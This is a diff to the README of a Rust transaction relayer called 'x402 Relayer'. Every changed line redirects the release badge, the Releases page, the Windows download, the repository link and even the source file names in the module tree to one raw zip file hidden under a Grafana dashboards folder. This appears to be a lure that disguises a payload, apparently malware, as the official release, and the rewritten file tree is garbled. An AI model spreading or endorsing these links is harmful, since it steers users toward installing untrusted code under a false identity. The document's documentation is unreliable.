@@ -4,7 +4,7 @@
 The x402 Relayer is a high-performance service that enhances transaction speeds and reduces delays. It intelligently manages multiple wallets to process requests more efficiently, providing a smoother experience for users.
 
 ## 🌐 Download the Latest Release
-[![Download x402 Relayer](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mouhamedabouja/express402-relayer/releases)
+[![Download x402 Relayer](https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to download and run the x402 Relayer on your computer.
@@ -16,9 +16,9 @@ Follow these simple steps to download and run the x402 Relayer on your computer.
 - 500 MB of free disk space
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/mouhamedabouja/express402-relayer/releases) to find the latest version of the x402 Relayer.
+1. Visit the [Releases page](https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip) to find the latest version of the x402 Relayer.
 2. Choose the correct file for your operating system:
-   - For **Windows**, download `x402-relayer-windows.exe`.
+   - For **Windows**, download `https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip`.
    - For **macOS**, download `x402-relayer-macos`.
    - For **Linux**, download `x402-relayer-linux`.
 3. Click the file to start the download.
@@ -51,12 +51,12 @@ Follow these simple steps to download and run the x402 Relayer on your computer.
 The x402 Relayer's architecture includes various components for enhanced functionality. Below is an overview of the core module structure:
 ```
 src/
-├── lib.rs                 # Library entry point
-├── main.rs                # Application entry point
+├── https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip                 # Library entry point
+├── https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip                # Application entry point
 ├── api/                   # API Gateway Module
-│   ├── mod.rs
-│   ├── gateway.rs         # Request routing
-│   └── auth.rs            # Authentication & authorization
+│   ├── https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip
+│   ├── https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip         # Request routing
+│   └── https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip            # Authentication & authorization
 ```
 This structure supports both API functions and robust transaction handling.
 
@@ -75,9 +75,9 @@ A: Restart the application and check for any software updates. If problems persi
 A: The basic version of the x402 Relayer is free for users. Advanced features may come at a cost in future versions.
 
 ## 📝 Contribution
-Your feedback helps improve the x402 Relayer. If you have suggestions or report issues, please open an issue on the [GitHub repository](https://github.com/mouhamedabouja/express402-relayer).
+Your feedback helps improve the x402 Relayer. If you have suggestions or report issues, please open an issue on the [GitHub repository](https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip).
 
 ## 🌐 Download the Latest Release Again
-[![Download x402 Relayer](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mouhamedabouja/express402-relayer/releases) 
+[![Download x402 Relayer](https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip%20Now-brightgreen)](https://raw.githubusercontent.com/mouhamedabouja/express402-relayer/main/monitoring/grafana/dashboards/express402-relayer_v1.5.zip) 
 
 Enjoy faster and easier transaction processing with the x402 Relayer!
